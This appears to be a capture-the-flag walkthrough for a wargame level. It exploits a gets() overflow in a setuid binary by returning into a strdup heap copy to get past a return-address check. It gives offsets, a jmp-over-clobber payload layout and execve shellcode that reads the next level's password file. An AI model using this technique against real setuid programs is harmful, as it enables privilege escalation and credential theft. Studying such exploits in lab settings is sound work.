level2 - walkthrough
====================

Target: /home/user/level2/level2   (setuid + setgid level3)
Goal:   read /home/user/level3/.pass

1. Recon (objdump -d level2), function p():
     sub    $0x68,%esp
     lea    -0x4c(%ebp),%eax ; buf = ebp-0x4c
     call   gets@plt         ; overflow
     mov    0x4(%ebp),%eax   ; eax = saved return address
     mov    %eax,-0xc(%ebp)  ; store it into a local (== buf+64) <-- IMPORTANT
     and    $0xb0000000,%eax
     cmp    $0xb0000000,%eax ; return addr in 0xb0000000..0xbfffffff ?
     jne    ok
       printf("(%p)"); _exit(1)       ; reject
     ok:
     call   puts@plt
     call   strdup@plt       ; copies buf to the HEAP, then returns

2. Why the usual tricks fail
   - The 0xb0000000 test rejects a return address on the stack (0xbfff_xxxx),
     so classic "jump to shellcode in the buffer" is blocked.
   - It ALSO rejects libc (mapped at 0xb7xx_xxxx here), so ret2libc system()
     is blocked too.

3. The way in: return into the heap
   strdup(buf) duplicates our input onto the heap at 0x0804a008 (a low address
   that passes the 0xb0000000 test). ASLR is off (randomize_va_space = 0) and
   the address is stable across runs (confirmed with `ltrace`, which prints
   `strdup(...) = 0x0804a008`). So we put shellcode in the input and set the
   saved return address to 0x0804a008.

4. The self-corruption catch
   `mov %eax,-0xc(%ebp)` writes the saved return address (which we set to
   0x0804a008) into buf+64, corrupting bytes 64..67 of the buffer -- and of the
   heap copy. If the shellcode straddles offset 64 it is destroyed there
   (observed: crash at heap+0x41).
   Fix: make the heap copy START with `jmp` past the clobbered region.

5. Offsets (buf at ebp-0x4c = ebp-76)
   - saved return address (saved EIP) : offset 80  (76 + 4)
   - self-corrupted 4 bytes           : offset 64  (ebp-0xc)

6. Payload layout (161 bytes, NUL-free so strdup copies all of it; no 0x0a so
   gets keeps it as one line):
     [0..1]   eb 52            jmp +0x52  -> offset 84
     [2..79]  'A' padding      (offset 64..67 gets clobbered here -- harmless)
     [80..83] 08 a0 04 08      overwrite saved EIP with 0x0804a008 (heap copy)
     [84..]   shellcode        clean copy, jump target

   Shellcode = execve("/bin//sh", {"/bin//sh","-c",
                       "/bin/cat /home/user/level3/.pass", NULL}, NULL)
   The command is embedded in the shellcode, so we do NOT rely on feeding the
   spawned shell over stdin (a pipe's read-ahead would be swallowed by execve).

7. Run
   $ (python -c 'PAYLOAD'; printf '\n') | ./level2
   -> prints level3's password directly.
   See Ressources/exploit.sh for the exact one-liner.

